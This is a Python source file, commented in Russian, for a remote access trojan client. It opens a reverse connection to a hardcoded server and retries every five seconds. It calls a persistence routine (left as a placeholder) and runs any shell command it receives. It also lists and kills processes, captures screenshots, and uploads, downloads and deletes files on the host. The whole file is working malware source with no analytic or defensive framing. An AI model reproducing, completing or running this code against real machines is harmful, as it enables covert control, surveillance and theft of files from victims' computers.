import socket
import subprocess
import os
import sys
import time

SERVER_IP = "192.168.100.3"  # Установите ваш IP сервера
SERVER_PORT = 5000
BUFFER_SIZE = 4096

def execute_command(command):
    try:
        return subprocess.getoutput(command)
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"

def is_windows():
    return os.name == 'nt'

# Если у вас есть функции автозапуска — вставьте их сюда.
# Ниже пропуск символом ... (оставьте ваши функции автозапуска неизменными).

def main():
    try:
        add_self_to_autostart()  # добавьте вашу функцию автозапуска или оставьте вызов пустым
    except Exception as e:
        print(f"Ошибка добавления в автозапуск: {e}")

    current_dir = os.getcwd()

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((SERVER_IP, SERVER_PORT))
            print(f"[INFO] Подключились к серверу {SERVER_IP}:{SERVER_PORT}")
        except Exception:
            print("[WARN] Не удалось подключиться к серверу. Пауза 5 секунд...")
            time.sleep(5)
            continue

        try:
            while True:
                data = s.recv(BUFFER_SIZE)
                if not data:
                    break
                command = data.decode(errors='ignore')
                if not command:
                    break
                if command == "exit":
                    break

                if command.startswith("cmd:"):
                    cmd = command[4:].strip()

                    # Обработка nohup
                    if "nohup" in cmd:
                        try:
                            subprocess.Popen(cmd, shell=True,
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
                            s.send("Команда запущена через nohup".encode())
                        except Exception as e:
                            s.send(f"Ошибка запуска команды с nohup: {e}".encode())
                        continue

                    # Запуск команд в фоне (&)
                    if cmd.endswith('&'):
                        cmd_no_amp = cmd.rstrip('&').strip()
                        try:
                            subprocess.Popen(cmd_no_amp, shell=True,
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
                            s.send("Команда выполнена в фоне".encode())
                        except Exception as e:
                            s.send(f"Ошибка при запуске фоновой команды: {e}".encode())
                        continue

                    if cmd.startswith("cd"):
                        path = cmd[2:].strip()
                        if not path:
                            path = os.path.expanduser("~")
                        try:
                            os.chdir(path)
                            current_dir = os.getcwd()
                            s.send(f"Сменена директория на {current_dir}".encode())
                        except Exception as e:
                            s.send(f"Ошибка смены директории: {e}".encode())

                    elif cmd.startswith("ls"):
                        path = cmd[2:].strip()
                        if not path or path == "~":
                            path = os.path.expanduser("~")
                        try:
                            entries = os.listdir(path)
                            dirs = []
                            files = []
                            for e in entries:
                                full_path = os.path.join(path, e)
                                if os.path.isdir(full_path):
                                    dirs.append(e + '/')
                                else:
                                    files.append(e)
                            result = "\n".join(sorted(dirs) + sorted(files))
                            s.send(result.encode())
                        except Exception:
                            s.send("Ошибка: у вас недостаточно прав для открытия данного файла/папки".encode())

                    else:
                        output = execute_command(cmd)
                        s.send(output.encode())

                elif command == "process_list":
                    if is_windows():
                        procs = subprocess.getoutput('tasklist')
                    else:
                        procs = subprocess.getoutput('ps aux')
                    s.send(procs.encode())

                elif command.startswith("kill:"):
                    pid = command[5:]
                    try:
                        if is_windows():
                            subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                        else:
                            subprocess.check_output(f'kill -9 {pid}', shell=True)
                        s.send(f"Процесс {pid} завершён.".encode())
                    except Exception as e:
                        s.send(f"Ошибка: {e}".encode())

                elif command == "screenshot":
                    try:
                        import pyautogui
                        screenshot = pyautogui.screenshot()
                        screenshot.save("screen.jpg")
                        with open("screen.jpg", "rb") as f_img:
                            while True:
                                chunk = f_img.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                        os.remove("screen.jpg")
                    except Exception as e:
                        s.send(f"Ошибка снятия скриншота: {e}".encode())

                elif command.startswith("download:"):
                    filepath = command[len("download:"):].strip()
                    try:
                        filesize = os.path.getsize(filepath)
                        s.sendall(filesize.to_bytes(8, byteorder='big'))
                        with open(filepath, "rb") as f:
                            while True:
                                chunk = f.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                    except Exception as e:
                        error_msg = f"Ошибка при чтении файла: {e}"
                        err_bytes = error_msg.encode()
                        s.sendall(len(err_bytes).to_bytes(8, byteorder='big'))
                        s.sendall(err_bytes)

                elif command.startswith("upload:"):
                    filepath = command[len("upload:"):].strip()
                    try:
                        with open(filepath, "wb") as f:
                            total_received = 0
                            while True:
                                chunk = s.recv(BUFFER_SIZE)
                                if chunk == b"__file_transfer_end__" or not chunk:
                                    break
                                f.write(chunk)
                                total_received += len(chunk)
                        s.send(f"Файл {os.path.basename(filepath)} успешно получен.\n".encode())
                        print(f"[INFO] Файл {filepath} успешно сохранён, размер: {total_received} байт")
                    except Exception as e:
                        s.send(f"Ошибка при сохранении файла: {e}".encode())
                        print(f"[ERROR] Ошибка при сохранении файла: {e}")

                elif command.startswith("delete:"):
                    filepath = command[len("delete:"):].strip()
                    try:
                        os.remove(filepath)
                        s.send(f"Файл {os.path.basename(filepath)} удалён.".encode())
                    except Exception as e:
                        s.send(f"Ошибка удаления файла: {e}".encode())

                else:
                    s.send("Неизвестная команда".encode())

        except Exception as e:
            print(f"[ERROR] Ошибка в основном цикле: {e}")
        finally:
            s.close()

        time.sleep(5)

if __name__ == "__main__":
    main()
